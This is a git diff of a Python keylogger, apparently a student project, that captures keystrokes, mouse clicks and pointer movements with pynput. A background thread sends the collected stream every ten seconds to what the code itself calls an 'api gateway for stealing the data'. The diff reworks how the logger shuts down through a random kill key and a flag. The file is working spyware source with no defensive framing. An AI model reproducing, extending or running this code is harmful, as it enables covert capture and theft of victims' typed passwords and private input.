@@ -1,17 +1,17 @@
 #Written by Eshed Sorotsky & Shilat Tsfoni
 
+from asyncio.windows_events import NULL
 from multiprocessing.connection import Listener
 from wsgiref import headers
 import win32console
-import pythoncom
 import requests
 import datetime
 from pynput import mouse,keyboard
 import string
 import random
-import os
 import time
 import threading
+import os
 
 #creates a random key
 def key_generator(size= 10, chars=string.ascii_lowercase + string.digits):
@@ -21,6 +21,8 @@ myWindow = win32console.GetConsoleWindow()
 #variable holding the global current x,y
 currentX =0
 currntY=0
+#variable holding the global bul
+bul = True
 #variable holding the global stream
 dataStream = ""
 #api gateway for stealing the data
@@ -49,9 +51,10 @@ def checkCondition():
         sendData()
 #activates the checkCondition every 10 seconds
 def threadFunc():
-    while(True):
+    while(bul):
         time.sleep(10)
         checkCondition()
+    return bul
 #sends data using the API gateway
 def sendData():
     global dataStream
@@ -73,7 +76,7 @@ def on_move(x,y):
         currentY = y
         mouseLog = 'Pointer moved to {0}'.format((x,y))
         dataStream +='\n'+mouseLog
-    return True
+    return bul
 #parses the mouse click event and adds it to the datastream
 def mouseClick(x,y,event,pressed):
     global dataStream 
@@ -85,45 +88,41 @@ def mouseClick(x,y,event,pressed):
     if event == mouse.Button.middle:
         mouseLog= 'middle {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
     dataStream +='\n'+mouseLog
-    return True    
+    return bul   
 #parses the keystroke event and adds it to the datastream
 def keyStrokes(event):
     global dataStream
+    global key
     currentLen = len(dataStream)
-    #if we hit escape will stop the keylogger
-    if key in dataStream:
-        exit(1)
-    #special keys
-    if type(event) == keyboard.Key:
-        if event == keyboard.Key.esc:
-            dataStream += 'key(esc) '
-        else:
-            dataStream += event
     #normal alphanumeric keys
-    elif type(event) == keyboard.KeyCode:
-        dataStream += event.char
+    try:
+        dataStream += ('{0}'.format(event.char))
+    #special keys
+    except AttributeError:
+        dataStream += (' \n special key {0} pressed \n'.format(event))
     return True
-#releaseד a key
+#releases a key
 def on_release_keyboard(event):
-    return True
+    global key, dataStream
+    global bul
+    if dataStream.find(key) != -1:
+        os._exit
+        bul = False
+    return bul
 
 #listener for keyboard events
 keyboardListener = keyboard.Listener(on_press=keyStrokes,on_release=on_release_keyboard)
 #listener for mouse events
-mouseListener = mouse.Listener(on_click=mouseClick)
-moveListener = mouse.Listener(on_move=on_move)
+mouseListener = mouse.Listener(on_click=mouseClick,on_move=on_move)
 #start the keyboardListener’s activity
 keyboardListener.start()
 #start the mouseListener’s activity
 mouseListener.start()
-#start the moveListener’s activity
-moveListener.start()
 dataSend= threading.Thread(target=threadFunc)
 #start the dataSend’s activity
 dataSend.start()
 #collect events until released
 keyboardListener.join()
-mouseListener.join()
 mouseListener.join()
 dataSend.join()
 
